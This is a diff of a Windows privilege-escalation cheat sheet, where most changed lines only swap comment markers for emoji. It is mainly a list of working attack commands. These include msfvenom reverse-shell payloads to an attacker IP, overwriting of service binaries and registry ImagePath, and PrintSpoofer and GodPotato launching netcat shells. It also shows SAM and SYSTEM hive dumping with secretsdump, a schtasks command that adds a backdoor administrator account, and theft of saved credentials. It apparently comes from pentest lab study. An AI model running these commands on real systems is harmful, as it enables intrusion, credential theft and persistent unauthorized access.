@@ -13,7 +13,7 @@ Get-LocalGroup
 Get-LocalGroupMember <GROUP-NAME>
 ```
 
-## 🔹Check for Credentials🔹
+##🔹Check for Credentials🔹
 
 ```
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
@@ -37,7 +37,7 @@ Currently stored credentials:
     Type: Domain Password
     User: WIN-QBA94KB3IOF\admin
 
-# Run the reverse_shell.exe executable using runas with the admin user's saved credentials:
+🔺Run the reverse_shell.exe executable using runas with the admin user's saved credentials:
 runas /savecred /user:admin C:\reverse_shell.exe
 
 cmdkey /add:MyServer /user:MyUser /pass:MyPassword
@@ -48,30 +48,30 @@ vaultcmd /list
 vaultcmd /listcreds:"Web Credentials" /all
 ```
 
-## 🔹Programs and Processes🔹
+##🔹Programs and Processes🔹
 ```
 Get-Process
-# 32 
+🔺 32 
 Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-# 64
+🔺 64
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 ```
 
-## 🔹ENV variables🔹
+##🔹ENV variables🔹
 
 ```
 Get-ChildItem
 Env:$env:PATH
 ```
 
-## 🔹File permissions🔹
+##🔹File permissions🔹
 
 ```
 icacls FILE
 ```
 
 
-## 🔹Acccess Permission🔹
+##🔹Acccess Permission🔹
 ```
 accesschk.exe /accepteula -dqv "C:\Python27"
 cacls "C:\Python27"
@@ -80,36 +80,36 @@ cacls "C:\Python27"
 # ⭐ Services ⭐ 
 - Is there a service that runs as SYSTEM but is writable by all logged-on users?  (NT AUTHORITY\INTERACTIVE)
 
-## 🔸Manage Service🔸 
+##🔸Manage Service🔸 
 ```
 Get-Service
 Get-Service | Select-Object Displayname,Status,ServiceName,Can*
 sc.exe query
 sc.exe query | select-string service_name
 
-# Binary Path
+🔺 Binary Path
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
 
 sc.exe stop <SERVICE>
 sc.exe start <SERVICE>
 
-# Is SERVICE_START_NAME = LocalSystem? -> SYSTEM Privileges?
-# Check if writable by all logged-on users (NT AUTHORITY\INTERACTIVE)
+🔺 Is SERVICE_START_NAME = LocalSystem? -> SYSTEM Privileges?
+🔺 Check if writable by all logged-on users (NT AUTHORITY\INTERACTIVE)
 sc.exe qc <SERVICE>
 sc.exe delete <SERVICE>
 
-# Check permissions
+🔺 Check permissions
 sc.exe sdshow <SERVICE> 
 
-# Change service configuration
+🔺 Change service configuration
 sc.exe config <SERVICE> binPath="C:\Users\Quickemu\Downloads\malicious.exe"
 
-# Add New Service
+🔺 Add New Service
 sc.exe create <SERVICE-NAME> binPath="<PATH-TO-EXECUTABLE>"
 ```
 
-## 🔸Weak Permissins on Service🔸 
+##🔸Weak Permissins on Service🔸 
 
  Use the `accesschk64' program to check if we have privileges over that process.
 
@@ -126,71 +126,71 @@ sc.exe create <SERVICE-NAME> binPath="<PATH-TO-EXECUTABLE>"
 | GENERIC_ALL           | Inherits SERVICE_CHANGE
 
 ```
-# List all services and the permissions each user level has on them.
+🔺 List all services and the permissions each user level has on them.
 accesschk.exe /accepteula -ucqv *
 
-# List permissions for a specific service:
+🔺List permissions for a specific service:
 accesschk.exe /accepteula -ucqv Spooler
 
-# List permissions for a specific directory:
+🔺List permissions for a specific directory:
 accesschk.exe /accepteula -dqv "C:\Users"
 
-# (BINARY_PATH_NAME) file is writable?
+🔺(BINARY_PATH_NAME) file is writable?
 accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
 
-# Find all weak folder:
+🔺Find all weak folder:
 accesschk.exe /accepteula -uwdqs Users C:\
 accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\
 
-# Find all weak files::
+🔺Find all weak files::
 accesschk.exe /accepteula -uwqs Users C:\*.*
 accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*
 
 
-# List services which the "Authenticated Users" user group have permissions over
-# (remember to check other user groups you are a member of).
+🔺List services which the "Authenticated Users" user group have permissions over
+🔺(remember to check other user groups you are a member of).
 accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 ```
 
-## 🔸Weak Permission on Service Binary🔸 
+##🔸Weak Permission on Service Binary🔸 
 ```
-# Get binary path
+🔺Get binary path
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
-# Check configuration of binary
-# (F) = Full control
+🔺Check configuration of binary
+🔺(F) = Full control
 icacls.exe .\simpleService.exe
 
-# If we have (F), we can override it
+🔺If we have (F), we can override it
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
 
-# Overwrite
+🔺Overwrite
 cp .\simpleService.exe .\simpleService.exe.bkp
 cp .\malicious.exe .\simpleService.exe
 
-# Restart
+🔺Restart
 sc.exe stop SimpleService
 sc.exe start SimpleService
 ```
 
-## 🔸Unquoted Service Path🔸 
+##🔸Unquoted Service Path🔸 
 ```
 C:\Users\Quickemu\Downloads\Example Directory\Another.exe
 C:\Users\Quickemu\Downloads\Example.exe
 ```
 
-## 🔸Weak Registry Permissions🔸 
+##🔸Weak Registry Permissions🔸 
 ```
-# Is SERVICE_START_NAME = LocalSystem? -> SYSTEM Privileges?
+🔺Is SERVICE_START_NAME = LocalSystem? -> SYSTEM Privileges?
 sc.exe qc <SERVICE>
 
-# Check if writable by all logged-on users (NT AUTHORITY\INTERACTIVE)
+🔺Check if writable by all logged-on users (NT AUTHORITY\INTERACTIVE)
 accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
 
-# Overwrite the ImagePath to malicious executable
+🔺Overwrite the ImagePath to malicious executable
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\malware.exe /f
 
-# Start
+🔺Start
 net start regsvc
 ```
 
@@ -205,77 +205,84 @@ Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService"
 Get-ScheduledTask
 schtasks /query
 
-# List task in a specific folder
+🔺List task in a specific folder
 Get-ScheduledTask | Where-Object {$_.TaskPath -eq "\Microsoft\Windows\Shell\"}
 
-# List tasks with details
+🔺List tasks with details
 Get-ScheduledTask -TaskName "MyTask" | Get-ScheduledTaskInfo
 schtasks /query /FO LIST /V
 Get-ScheduledTask -TaskName "XblGameSaveTask" | Format-List *
 
-# Extract binary path and arguments of services
+🔺Extract binary path and arguments of services
 (Get-ScheduledTask -TaskName "XblGameSaveTask").Actions
 Get-ScheduledTask | ForEach-Object { $_.Actions }
 ```
 
-## ⭐DLLs⭐
+##⭐DLLs⭐
 ```
-# List out DLLs of a given service
+🔺List out DLLs of a given service
 .\Listdlls64.exe /accepteula simpleService
 ```
 
-## ⭐Permissions⭐
+#🔺⭐Permissions⭐
 ```
-# SeImpersonatePrivilege
+🔺 SeImpersonatePrivilege
 ./PrintSpoofer64.exe -c "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
 ./GodPotato-NET2.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
 
-# SeBackupPrivilege
-## Copy SAM and SYSTEM and crack
-mkdir C:\temp
-reg save hklm\sam C:\temp\sam.hive
-reg save hklm\system C:\temp\system.hive
-impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+🔺 SeAssignPrimaryTokenPrivilege + SeImpersonatePrivilege
 
-# SeChangeNotifyPrivilege
+🔺 SeBackupPrivilege
+ 
+1. mkdir C:\temp
+# Copy SAM and SYSTEM
+2. reg save hklm\sam C:\temp\sam.hive
+   reg save hklm\system C:\temp\system.hive
+# Crack 
+3. impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+
+🔺 SeChangeNotifyPrivilege
 1. Run SeManageVolumeExploit.exe
 2. Create malicious "PrintConfig.dll"
 3. copy PrintConfig.dll C:\Windows\System32\spool\drivers\x64\3\
 4. Set up NC listener
 5. Execute "$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}") $object = [Activator]::CreateInstance($type)"
 
-# SeBatchLogonRight, SeCreateGlobalPrivilege
+🔺 SeBatchLogonRight, SeCreateGlobalPrivilege
 1. Can create scheduled task?
 2. Run elevated task
 3. schtasks /create /tn "BackdoorTask" /tr "cmd.exe /c net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add" /sc once /st 00:00 
 schtasks /run /tn "BackdoorTask"
 
-```
 
 
-```
 
 ```
 
-# ⭐ Registry⭐
 
-## 🔸AutoRuns🔸
+```
+
+```
+
+🔺⭐ Registry⭐
+
+##🔸AutoRuns🔸
 Run
 ```
-# Query the registry for AutoRun executables:
+🔺 Query the registry for AutoRun executables:
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
     SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
     My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
 
-# Check if AutoRun Executable is writable
+🔺 Check if AutoRun Executable is writable
 accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
 
-# Overwrite exe
+🔺Overwrite exe
 C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
 
-# Restart VM
+🔺Restart VM
 shutdown /r /t 0
 ```
 
@@ -290,20 +297,20 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Na
  Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe"
 ```
 
-## 🔸AlwaysInstallElevated🔸
+##🔸AlwaysInstallElevated🔸
 ```
-# Check if Always install Evalated is activated:
+🔺Check if Always install Evalated is activated:
 Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
 Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
 
-# Generate malicious MSI
+🔺Generate malicious MSI
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f msi > sample.msi
 
-# Execute it
+🔺Execute it
 msiexec /quiet /qn /i sample.msi
 ```
 
-## 🔸UAC Bypass🔸
+##🔸UAC Bypass🔸
 
 
 UAC can have different configuration levels:
@@ -321,7 +328,7 @@ If you get a 1, then UAC is enabled. Otherwise is disabled.
 Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
 
-#  Check specific UAC level
+🔺 Check specific UAC level
 Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select-Object ConsentPromptBehaviorAdmin
 ```
 
@@ -348,7 +355,7 @@ Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
 ```
 
 
-### 🔹Insecure GUI Apps🔹
+###🔹Insecure GUI Apps🔹
 
 Note that Paint is running with admin privileges,
 In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
